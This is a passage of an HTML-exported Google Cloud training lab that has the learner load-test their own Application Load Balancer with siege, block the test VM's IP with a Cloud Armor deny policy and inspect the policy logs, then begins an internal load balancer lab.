</span><code>http://[LB_IP_v6]</code><span>. Make sure to replace </span><code>[LB_IP_v6]</code><span> with the IPv6 address of the load balancer.</span></p><h3 id='stress-test-the-application-load-balancer-2'><span>Stress test the Application Load Balancer</span></h3><p><span>Create a new VM to simulate a load on the Application Load Balancer using </span><code>siege</code><span>. Then, determine if traffic is balanced across both backends when the load is high.</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create instance</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Machine configuration</span></strong><span>:</span></p><p><span>Select the following values:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>siege-vm</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>Region 3</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>Zone 3</code></td></tr><tr><td style='text-align:left;' ><span>Series</span></td><td style='text-align:left;' ><code>E2</code></td></tr></tbody></table></figure></li></ol><p><span>Given that </span><strong><code>Region 3</code></strong><span> is closer to </span><strong><code>Region 1</code></strong><span> than to </span><strong><code>Region 2</code></strong><span>, traffic should be forwarded only to </span><strong><code>Region 1</code><span>-mig</span></strong><span> (unless the load is too high).</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the </span><strong><span>siege-vm</span></strong><span> instance to be created.</span></p></li><li><p><span>For </span><strong><span>siege-vm</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>Run the following command, to install siege:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get -y install siege</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To store the IPv4 address of the Application Load Balancer in an environment variable, run the following command, replacing </span><code>[LB_IP_v4]</code><span> with the IPv4 address:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export LB_IP=[LB_IP_v4]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To simulate a load, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">siege -c 150 -t120s http://$LB_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the Cloud console, click </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; click </span><strong><span>VIEW ALL PRODUCTS</span></strong><span> &gt; </span><strong><span>Networking</span></strong><span> &gt; </span><strong><span>Network Services</span></strong><span> &gt; </span><strong><span>Load balancing</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Backends</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>http-backend</span></strong><span>.</span></p></li><li><p><span>Navigate to </span><strong><span>http-lb</span></strong><span>.</span></p></li><li><p><span>Click on the </span><strong><span>Monitoring</span></strong><span> tab.</span></p></li><li><p><span>Monitor the </span><strong><span>Frontend Location (Total inbound traffic)</span></strong><span> between North America and the two backends for 2 to 3 minutes.</span></p></li></ol><p><span>At first, traffic should just be directed to </span><strong><code>Region 1</code><span>-mig</span></strong><span> but as the RPS increases, traffic is also directed to </span><strong><code>Region 2</code></strong><span>.</span></p><p><span>This demonstrates that by default traffic is forwarded to the closest backend but if the load is very high, traffic can be distributed across the backends.</span></p><ol start='' ><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal of </span><strong><span>siege-vm</span></strong><span>.</span></p></li><li><p><span>Press </span><strong><span>CTRL+C</span></strong><span> to stop siege if it&#39;s still running.</span></p></li></ol><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">New configuration template added to /home/student-02-dd02c94b8808/.siege</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Run siege -C to view the current settings in that file</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{ &nbsp; &nbsp; &nbsp; "transactions": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  24729,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "availability": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 100.00,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "elapsed_time": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 119.07,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "data_transferred": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 3.77,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "response_time": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  0.66,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "transaction_rate": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 207.68,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "throughput": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0.03,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "concurrency": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  137.64,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "successful_transactions": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 24729,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "failed_transactions": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "longest_transaction": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10.45,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "shortest_transaction": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0.03</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 338px;"></div><div class="CodeMirror-gutters" style="display: none; height: 338px;"></div></div></div></pre><h2 id='task-5-denylist-the-siege-vm-2'><span>Task 5. Denylist the siege-vm</span></h2><p><span>Use Cloud Armor to denylist the </span><strong><span>siege-vm</span></strong><span> from accessing the Application Load Balancer.</span></p><h3 id='create-the-security-policy-2'><span>Create the security policy</span></h3><p><span>Create a Cloud Armor security policy with a denylist rule for the </span><strong><span>siege-vm</span></strong><span>.</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Note the </span><strong><span>External IP</span></strong><span> of the </span><strong><span>siege-vm</span></strong><span>. This will be referred to as </span><code>[SIEGE_IP]</code><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> There are ways to identify the external IP address of a client trying to access your Application Load Balancer. For example, you could examine traffic captured by </span><a href='https://cloud.google.com/vpc/docs/using-flow-logs#exporting_logs_to_bigquery_name_short_pubsub_name_short_and_custom_targets'><span>VPC Flow Logs in BigQuery</span></a><span> to determine a high volume of incoming requests.</span></p><ol start='' ><li><p><span>In the Cloud console, click </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; click </span><strong><span>VIEW ALL PRODUCTS</span></strong><span> &gt; </span><strong><span>Networking</span></strong><span> &gt; </span><strong><span>Network Security</span></strong><span> &gt; </span><strong><span>Cloud Armor policies</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create policy</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>denylist-siege</span></td></tr><tr><td style='text-align:left;' ><span>Default rule action</span></td><td style='text-align:left;' ><span>Allow</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add a rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Condition &gt; Match</span></td><td style='text-align:left;' ><em><span>Enter the SIEGE_IP</span></em></td></tr><tr><td style='text-align:left;' ><span>Action</span></td><td style='text-align:left;' ><span>Deny</span></td></tr><tr><td style='text-align:left;' ><span>Response code</span></td><td style='text-align:left;' ><span>403 (Forbidden)</span></td></tr><tr><td style='text-align:left;' ><span>Priority</span></td><td style='text-align:left;' ><span>1000</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Save Change to Rule</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add Target</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Type</span></strong><span>, select </span><strong><span>Backend service (external application load balancer)</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Target</span></strong><span>, select </span><strong><span>http-backend</span></strong><span> and if prompted confirm </span><strong><span>Replace</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create policy</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Alternatively, you could set the default rule to </span><strong><span>Deny</span></strong><span> and only allowlist or allow traffic from authorized users/IP addresses.</span></p><ol start='' ><li><p><span>Wait for the policy to be created before moving to the next step.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Denylist the siege-vm</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='verify-the-security-policy-4'><span>Verify the security policy</span></h3><p><span>Verify that the </span><strong><span>siege-vm</span></strong><span> cannot access the Application Load Balancer.</span></p><ol start='' ><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal of </span><strong><span>siege-vm</span></strong><span>.</span></p></li><li><p><span>To access the load balancer, run the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://$LB_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;!doctype html&gt;&lt;meta charset="utf-8"&gt;&lt;meta name=viewport content="width=device-width, initial-scale=1"&gt;&lt;title&gt;403&lt;/title&gt;403 Forbidden</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> It might take a couple of minutes for the security policy to take effect. If you are able to access the backends, keep trying until you get the </span><strong><span>403 Forbidden error</span></strong><span>.</span></p><ol start='' ><li><p><span>Open a new tab in your browser and navigate to </span><code>http://[LB_IP_v4]</code><span>. Make sure to replace </span><code>[LB_IP_v4]</code><span> with the IPv4 address of the load balancer.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You can access the Application Load Balancer from your browser because of the default rule to </span><strong><span>allow</span></strong><span> traffic; however, you cannot access it from the </span><strong><span>siege-vm</span></strong><span> because of the </span><strong><span>deny</span></strong><span> rule that you implemented.</span></p><ol start='' ><li><p><span>Back in the SSH terminal of siege-vm, to simulate a load, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">siege -c 150 -t120s http://$LB_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The command will not generate any output.</span></p><p><span>Explore the security policy logs to determine if this traffic is also blocked.</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Network Security</span></strong><span> &gt; </span><strong><span>Cloud Armor Policies</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>denylist-siege</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Logs</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>View policy logs</span></strong><span>.</span></p></li><li><p><span>On the Logging page, make sure to clear all the text in the </span><strong><span>Query preview</span></strong><span>. Select resource to </span><strong><span>Application Load Balancer</span></strong><span> &gt; </span><strong><span>http-lb-forwarding-rule</span></strong><span> &gt; </span><strong><span>http-lb</span></strong><span> then click </span><strong><span>Apply</span></strong><span>.</span></p></li><li><p><span>Now click </span><strong><span>Run Query</span></strong><span>.</span></p></li><li><p><span>Expand a log entry in </span><strong><span>Query results</span></strong><span>.</span></p></li><li><p><span>Expand </span><strong><span>httpRequest</span></strong><span>.</span></p></li></ol><p><span>The request should be from the </span><strong><span>siege-vm</span></strong><span> IP address. If not, expand another log entry.</span></p><ol start='' ><li><p><span>Expand </span><strong><span>jsonPayload</span></strong><span>.</span></p></li><li><p><span>Expand </span><strong><span>enforcedSecurityPolicy</span></strong><span>.</span></p></li><li><p><span>Notice that the </span><strong><span>configuredAction</span></strong><span> is to </span><code>DENY</code><span> with the </span><strong><span>name</span></strong><span> </span><code>denylist-siege</code><span>.</span></p></li></ol><p><img src="images\kf8dX3SIyN706oBbZhyrAEC%2B9goZrVR%2BzWKqn0is0OM%3D" referrerpolicy="no-referrer" alt="Query results page"></p><p><span>Cloud Armor security policies create logs that can be explored to determine when traffic is denied and when it is allowed, along with the source of the traffic.</span></p><h2 id='congratulations-34'><span>Congratulations!</span></h2><p><span>You configured an Application Load Balancer with backends in </span><code>Region 1</code><span> and </span><code>Region 2</code><span>. Then, you stress tested the Load Balancer with a VM and denylisted the IP address of that VM with Cloud Armor. You were able to explore the security policy logs to identify why the traffic was blocked.</span></p><p>&nbsp;</p><p>&nbsp;</p><h2 id='lab---create-an-internal-load-balancer'><span>LAB - Create an Internal Load Balancer</span></h2><h2 id='overview-38'><span>Overview</span></h2><p><span>Google Cloud offers Internal Load Balancing for your TCP/UDP-based traffic. Internal Load Balancing enables you to run and scale your services behind a private load balancing IP address that is accessible only to your internal virtual machine instances.</span></p><p><span>In this lab you create two managed instance groups in the same region. Then, you configure and test an Internal Load Balancer with the instances groups as the backends, as shown in this network diagram:</span></p><p><img src="images\k3u04mphJhk%2F2yM84NjgPiZHrbCuzbdwAQ98vnaoHQo%3D" referrerpolicy="no-referrer" alt="Network_Diagram.png"></p><h3 id='objectives-26'><span>Objectives</span></h3><p><span>In this lab you learn how to perform the following tasks:</span></p><ul><li><p><span>Create HTTP and health check firewall rules</span></p></li><li><p><span>Configure two instance templates</span></p></li><li><p><span>Create two managed instance groups</span></p></li><li><p><span>Configure and test an internal load balancer</span></p></li></ul><h2 id='setup-and-requirements-34'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-21'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-16'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" 